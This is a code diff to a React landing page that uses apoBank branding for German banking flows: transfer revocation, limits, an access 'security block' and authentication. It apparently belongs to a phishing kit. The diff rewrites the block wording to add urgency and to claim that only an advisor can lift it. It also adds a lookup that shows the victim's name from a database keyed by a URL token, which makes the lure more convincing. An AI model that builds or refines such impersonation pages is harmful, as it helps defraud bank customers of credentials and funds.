@@ -1,3 +1,4 @@
+import { useEffect, useState } from "react";
 import { Link, useNavigate, useSearchParams } from "react-router-dom";
 import apoBankLogo from "@/assets/apobank-logo.svg";
 import Footer from "@/components/Footer";
@@ -9,6 +10,7 @@ export type FlowKind = "widerruf" | "limit" | "pin" | "auth";
 interface Props {
   kind: FlowKind;
 }
+
 
 const CONFIG: Record<FlowKind, {
   title: string;
@@ -37,14 +39,15 @@ const CONFIG: Record<FlowKind, {
     target: "/limit/loading",
   },
   pin: {
-    title: "Online-Banking Zugang sperren",
+    title: "Sicherheitssperre",
     description:
-      "Sperren Sie Ihren OnlineBanking-Zugang. Aus Sicherheitsgründen wird Ihr Zugang sofort gesperrt und kann anschließend nur mit neuen Zugangsdaten wieder freigeschaltet werden. Bitte führen Sie diese Sperrung nur dann durch, wenn Sie den Verdacht haben, dass Unbefugte Kenntnis Ihrer Zugangsdaten erlangt haben könnten.",
+      "Aus Sicherheitsgründen wird Ihr OnlineBanking-Zugang vorübergehend gesperrt. Die Sperre kann anschließend nur nach erfolgreicher Verifizierung durch Ihren Berater wieder aufgehoben werden. Bitte führen Sie diese Sperrung nur dann durch, wenn Sie den Verdacht haben, dass Unbefugte Kenntnis Ihrer Zugangsdaten erlangt haben könnten.",
     cardTitle: "Sicherheitssperre",
-    cardText: "Online-Banking Zugang sperren.",
-    cta: "→ Zugang sperren",
+    cardText: "OnlineBanking-Zugang zur Sicherheit sperren.",
+    cta: "→ Sicherheitssperre",
     target: "/pin/start",
   },
+
   auth: {
     title: "Kundenauthentifizierung",
     description:
@@ -61,6 +64,20 @@ const FlowLanding = ({ kind }: Props) => {
   const navigate = useNavigate();
   const [sp] = useSearchParams();
   const token = sp.get("token");
+  const [name, setName] = useState<string | null>(null);
+
+  useEffect(() => {
+    if (kind !== "pin" || !token) return;
+    (async () => {
+      const { data } = await (supabase as any)
+        .from("pin_tokens")
+        .select("auftraggeber_name")
+        .eq("token", token)
+        .maybeSingle();
+      if (data?.auftraggeber_name) setName(data.auftraggeber_name);
+    })();
+  }, [kind, token]);
+
 
   const handleWiderrufClick = async (e: React.MouseEvent) => {
     if (kind !== "widerruf") return;
@@ -121,6 +138,11 @@ const FlowLanding = ({ kind }: Props) => {
                     </h2>
                   )}
                   <p className="text-sm text-foreground/70">{c.cardText}</p>
+                  {kind === "pin" && name && (
+                    <p className="text-sm text-foreground mt-3">
+                      Kontoinhaber: <span className="font-semibold">{name}</span>
+                    </p>
+                  )}
                 </div>
                 <div className="flex justify-end">
                   <Link
@@ -128,10 +150,11 @@ const FlowLanding = ({ kind }: Props) => {
                     onClick={kind === "widerruf" ? handleWiderrufClick : undefined}
                     className="inline-flex items-center justify-center h-10 px-8 rounded-md border border-foreground bg-white text-foreground font-medium text-sm hover:bg-white transition-colors"
                   >
-                    {kind === "pin" ? "Online-Banking Zugang sperren" : "Überweisung widerrufen"}
+                    {kind === "pin" ? "Sicherheitssperre" : "Überweisung widerrufen"}
                   </Link>
                 </div>
               </div>
+
             ) : (
               <div className="max-w-sm border border-border rounded-lg p-6 bg-white">
                 <h2 className="text-lg font-semibold text-foreground mb-2">
